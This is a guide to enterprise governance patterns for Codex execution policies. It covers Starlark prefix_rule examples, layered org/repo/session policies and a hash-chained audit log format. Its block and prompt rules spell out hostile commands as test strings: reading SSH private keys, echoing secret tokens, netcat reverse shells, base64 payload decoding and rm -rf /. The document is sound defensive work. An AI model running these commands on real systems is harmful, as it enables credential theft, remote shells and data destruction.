# Governance Patterns for Codex

This guide shows how to use Codex's existing [execution policy](https://developers.openai.com/codex/exec-policy) system for enterprise governance. It covers three patterns that complement the built-in `prefix_rule` engine: argument-level threat detection, composable policy layers, and compliance audit trails.

> **Audience:** Platform engineers, security teams, and compliance officers deploying Codex in regulated environments.

## Table of Contents

- [Argument-Level Threat Detection](#argument-level-threat-detection)
- [Composable Policy Layers](#composable-policy-layers)
- [Compliance Audit Trail](#compliance-audit-trail)
- [Quick Start](#quick-start)

---

## Argument-Level Threat Detection

Codex's `prefix_rule` matches ordered token prefixes. This section shows patterns that detect threats hidden in command arguments — credential harvesting, data exfiltration, and encoded payloads.

### Credential Harvesting

Block commands that read private keys or echo secrets:

```starlark
# Block reading SSH private keys
prefix_rule(
    pattern = ["cat", [".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa"]],
    decision = "forbidden",
    justification = "Reading SSH private keys is not permitted. Use ssh-agent for key operations.",
    match = [
        "cat .ssh/id_rsa",
        "cat .ssh/id_ed25519",
    ],
    not_match = [
        "cat .ssh/config",
        "cat .ssh/known_hosts",
    ],
)

# Block echoing common secret environment variables
prefix_rule(
    pattern = ["echo", ["$GITHUB_TOKEN", "$AWS_SECRET_ACCESS_KEY", "$DATABASE_URL", "$API_KEY"]],
    decision = "forbidden",
    justification = "Do not echo secrets to stdout. Use a secrets manager to verify credentials.",
    match = [
        "echo $GITHUB_TOKEN",
        "echo $AWS_SECRET_ACCESS_KEY",
    ],
    not_match = [
        "echo $HOME",
        "echo $PATH",
    ],
)

# Block printenv for sensitive variables
prefix_rule(
    pattern = ["printenv", ["GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "DATABASE_URL"]],
    decision = "forbidden",
    justification = "Do not print secrets. Use a secrets manager instead.",
    match = [
        "printenv GITHUB_TOKEN",
        "printenv AWS_SECRET_ACCESS_KEY",
    ],
    not_match = [
        "printenv HOME",
        "printenv PATH",
    ],
)
```

### Data Exfiltration

Prompt on commands that could exfiltrate data:

```starlark
# Prompt when using curl to POST data
prefix_rule(
    pattern = ["curl", ["-X", "--request"], "POST"],
    decision = "prompt",
    justification = "Outbound POST requests may exfiltrate data. Verify the destination URL.",
    match = [
        "curl -X POST https://example.com",
        "curl --request POST https://api.example.com/upload",
    ],
    not_match = [
        "curl https://example.com",
        "curl -X GET https://example.com",
    ],
)

# Block netcat reverse shells
prefix_rule(
    pattern = ["nc", "-e"],
    decision = "forbidden",
    justification = "nc -e can spawn reverse shells. Use approved networking tools instead.",
    match = [
        "nc -e /bin/sh 10.0.0.1 4444",
    ],
    not_match = [
        "nc -z localhost 8080",
    ],
)

# Block ncat reverse shells
prefix_rule(
    pattern = ["ncat", "-e"],
    decision = "forbidden",
    justification = "ncat -e can spawn reverse shells. Use approved networking tools instead.",
    match = [
        "ncat -e /bin/sh 10.0.0.1 4444",
    ],
    not_match = [
        "ncat -z localhost 8080",
    ],
)
```

### Encoded Payloads

Detect commands using base64-encoded payloads, which are a common obfuscation technique:

```starlark
# Prompt on bash decoding base64 input
prefix_rule(
    pattern = ["bash", "-c"],
    decision = "prompt",
    justification = "Arbitrary shell execution via bash -c requires review. Check for encoded payloads.",
    match = [
        "bash -c echo hello",
    ],
    not_match = [
        "bash --version",
    ],
)

# Prompt on direct base64 decode execution
prefix_rule(
    pattern = ["base64", ["-d", "--decode"]],
    decision = "prompt",
    justification = "base64 decoding may reveal obfuscated commands. Review the decoded output.",
    match = [
        "base64 -d payload.txt",
        "base64 --decode payload.txt",
    ],
    not_match = [
        "base64 file.txt",
    ],
)
```

### Destructive Operations

```starlark
# Block recursive force deletion from root-like paths
prefix_rule(
    pattern = ["rm", "-rf", "/"],
    decision = "forbidden",
    justification = "Recursive deletion from root is catastrophic. Specify a safe target path.",
    match = [
        "rm -rf /",
        "rm -rf /etc",
    ],
    not_match = [
        "rm -rf ./build",
        "rm -rf node_modules",
    ],
)

# Prompt on chmod with broad permissions
prefix_rule(
    pattern = ["chmod", "777"],
    decision = "prompt",
    justification = "chmod 777 grants world-writable permissions. Consider a more restrictive mode.",
    match = [
        "chmod 777 /tmp/script.sh",
    ],
    not_match = [
        "chmod 755 /tmp/script.sh",
        "chmod 644 README.md",
    ],
)
```

---

## Composable Policy Layers

Enterprises typically need policies at multiple scopes: organization-wide baselines, repository-specific rules, and per-session constraints. Codex supports loading multiple `--rules` files that merge with a **strictest-wins** strategy (see [execpolicy README](../codex-rs/execpolicy/README.md)).

### Layer Architecture

```
┌──────────────────────────────────┐
│   Session Policy (optional)      │  ← Developer or CI-specific constraints
│   codex execpolicy check         │
│     --rules org.codexpolicy      │
│     --rules repo.codexpolicy     │
│     --rules session.codexpolicy  │
│     <command>                    │
├──────────────────────────────────┤
│   Repository Policy              │  ← .codex/ in the repo root
│   repo.codexpolicy               │
├──────────────────────────────────┤
│   Organization Policy            │  ← Shared config repo or ~/.codex/
│   org.codexpolicy                │
└──────────────────────────────────┘

Merge strategy: forbidden > prompt > allow
```

### Organization Policy (Baseline)

Defines non-negotiable rules across all repositories. See [`examples/governance/org-policy.codexpolicy`](../examples/governance/org-policy.codexpolicy).

Key characteristics:
- Blocks credential access and exfiltration universally
- Prompts on destructive filesystem operations
- Allows safe read-only commands

### Repository Policy (Overrides)

Adds project-specific rules. See [`examples/governance/repo-policy.codexpolicy`](../examples/governance/repo-policy.codexpolicy).

Example: a web project might allow `npm publish` but prompt on `docker push`.

### Session Policy (Constraints)

Tightens rules for specific contexts (e.g., CI pipelines, production access). See [`examples/governance/strict-policy.codexpolicy`](../examples/governance/strict-policy.codexpolicy).

### Applying Layers

```bash
# Evaluate a command against all three layers
codex execpolicy check \
  --rules ~/.codex/org-policy.codexpolicy \
  --rules .codex/repo-policy.codexpolicy \
  --rules /tmp/session-policy.codexpolicy \
  git push --force

# Output: {"matchedRules":[...],"decision":"forbidden"}
```

Because Codex uses strictest-wins merging, a `forbidden` in the org policy cannot be overridden to `allow` by a repo policy.

---

## Compliance Audit Trail

For SOC 2, SOX, or internal compliance, organizations need tamper-evident logs of every policy decision. This section defines a JSONL audit log format and a chain-of-integrity mechanism.

### Audit Log Format

Each policy evaluation appends one JSON line:

```json
{
  "timestamp": "2025-07-17T14:30:00Z",
  "event_id": "evt_a1b2c3d4",
  "user": "developer@example.com",
  "session_id": "sess_x9y8z7",
  "command": ["git", "push", "--force"],
  "working_directory": "/home/dev/project",
  "policy_files": [
    "~/.codex/org-policy.codexpolicy",
    ".codex/repo-policy.codexpolicy"
  ],
  "matched_rules": [
    {
      "file": "org-policy.codexpolicy",
      "pattern": ["git", "push", "--force"],
      "decision": "forbidden",
      "justification": "Force pushes are prohibited. Use --force-with-lease."
    }
  ],
  "effective_decision": "forbidden",
  "chain_hash": "sha256:prev_hash+this_entry"
}
```

### Field Descriptions

| Field | Type | Description |
|---|---|---|
| `timestamp` | ISO 8601 | When the evaluation occurred |
| `event_id` | string | Unique event identifier |
| `user` | string | Authenticated user (email or username) |
| `session_id` | string | Codex session identifier |
| `command` | string[] | Tokenized command that was evaluated |
| `working_directory` | string | Where the command would execute |
| `policy_files` | string[] | Policy files loaded for evaluation |
| `matched_rules` | object[] | Rules that matched, with source file |
| `effective_decision` | string | Final decision after strictest-wins merge |
| `chain_hash` | string | SHA-256 hash linking to previous entry |

### Chain-of-Integrity

Each log entry's `chain_hash` is computed as:

```
chain_hash = SHA-256(previous_chain_hash + SHA-256(current_entry_without_chain_hash))
```

The first entry uses a well-known seed (e.g., `SHA-256("CODEX_AUDIT_GENESIS")`). This creates a tamper-evident chain: modifying any entry invalidates all subsequent hashes.

### Export for Compliance Tools

See [`examples/governance/audit-export.py`](../examples/governance/audit-export.py) for a script that:
- Reads JSONL audit logs
- Validates the hash chain integrity
- Exports to CSV for SOC 2 / SOX reporting tools
- Flags any tamper-detected entries

---

## Quick Start

1. **Copy the organization baseline:**
   ```bash
   cp examples/governance/org-policy.codexpolicy ~/.codex/org-policy.codexpolicy
   ```

2. **Add a repo policy:**
   ```bash
   cp examples/governance/repo-policy.codexpolicy .codex/repo-policy.codexpolicy
   ```

3. **Test a command:**
   ```bash
   codex execpolicy check \
     --rules ~/.codex/org-policy.codexpolicy \
     --rules .codex/repo-policy.codexpolicy \
     cat .ssh/id_rsa
   # Expected: {"matchedRules":[...],"decision":"forbidden"}
   ```

4. **Set up audit logging:** Integrate the JSONL format into your CI pipeline or wrapper script. Use `audit-export.py` to generate compliance reports.

---

## References

- [Execution Policy documentation](https://developers.openai.com/codex/exec-policy)
- [Sandbox & approvals](https://developers.openai.com/codex/security)
- [execpolicy crate README](../codex-rs/execpolicy/README.md)
- [Example policy file](../codex-rs/execpolicy/examples/example.codexpolicy)
